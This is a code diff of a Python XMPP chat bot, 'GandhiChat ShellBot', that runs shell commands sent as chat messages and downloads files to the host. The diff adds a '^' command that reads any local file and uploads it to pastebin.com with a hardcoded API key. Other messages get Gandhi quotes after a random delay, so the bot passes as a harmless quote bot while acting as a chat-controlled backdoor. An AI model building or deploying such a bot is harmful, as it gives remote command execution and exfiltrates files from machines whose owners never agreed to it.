@@ -1,15 +1,16 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-# GandhiChat ShellBot v0.3
-# Code heavily borrowed from SleekXMPP's MUCBot 
+# GandhiChat ShellBot v0.4
+# Code borrowed from SleekXMPP's MUCBot and Sentynel's Pastebin script
 # https://github.com/fritzy/SleekXMPP/blob/develop/examples/muc.py
+# https://sentynel.com/project/Pastebin_Script
 
 import time, random
 import sys, os, subprocess
 import logging
 import getpass
-import urllib2
+import urllib2, urllib
 from optparse import OptionParser
 import sleekxmpp
 
@@ -19,10 +20,14 @@ import sleekxmpp
 USERNAME = 'example@gmail.com'
 CMD_TOKEN = '$'
 DWNLD_TOKEN = '!'
+UPLD_TOKEN = '^'
 
 SERVICE_DISCOVERY = 'xep_0030'
 MULTIUSER_CHAT = 'xep_0045'
 XMPP_PING = 'xep_0199'
+
+#Pastebin varriables
+devkey = "6c71766cdadff9f33347e80131397ac2"
 
 #Gandhi Version 
 MESSAGES = ['I fear no one on Earth.', 'I follow God.', 'I bear no ill will toward anyone.', 'I will not submit to injustice.', 'I will conquer untruth with truth.', 'I will put up with suffering.', 'Be the change you wish to see.', 'My life is my message', 'Live as though you would die today.', 'Learn as though you would live forever.',]
@@ -78,6 +83,11 @@ class MUCBot(sleekxmpp.ClientXMPP):
           body.lstrip(DWNLD_TOKEN).split('/')[-1])
         msg.reply(savedToMsg).send()
         return
+      #Execute and respond to the ^upload instruction
+      if body and body[0] == UPLD_TOKEN:
+        reply = self.upload(body.lstrip(UPLD_TOKEN))
+        msg.reply("file posted to: "+reply).send()
+        return
       time.sleep(random.uniform(0.4, 2.45))
       reply = random.choice(MESSAGES)
       msg.reply(reply).send()
@@ -97,6 +107,7 @@ class MUCBot(sleekxmpp.ClientXMPP):
                                                 presence['muc']['nick']),
                         mtype='groupchat')
 
+  #Essential shell functionality
   def run_command(self, cmd):
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -111,6 +122,27 @@ class MUCBot(sleekxmpp.ClientXMPP):
     localFile = open(filename, 'w')
     localFile.write(message.read())
     localFile.close()
+
+  #Make paste request
+  def upload(self, filename):
+    localFile = open(filename, 'r')
+    fi = localFile.read()
+    localFile.close()
+    target = {"api_paste_code":"".join(fi), "filename":"stdin"}
+    target["api_dev_key"] = devkey
+    target["api_option"] = "paste"
+    try:
+      req = urllib2.urlopen("http://pastebin.com/api/api_post.php", urllib.urlencode(target))
+    except urllib2.URLError:
+      print "Error uploading", filename + ":", "Network error"
+      exit(2)
+    else:
+      reply = req.read()
+      if "Bad API request" in reply:
+        print "Error uploading", filename + ":", reply
+        exit(2)
+      else:
+        return reply
 
 
 def main():
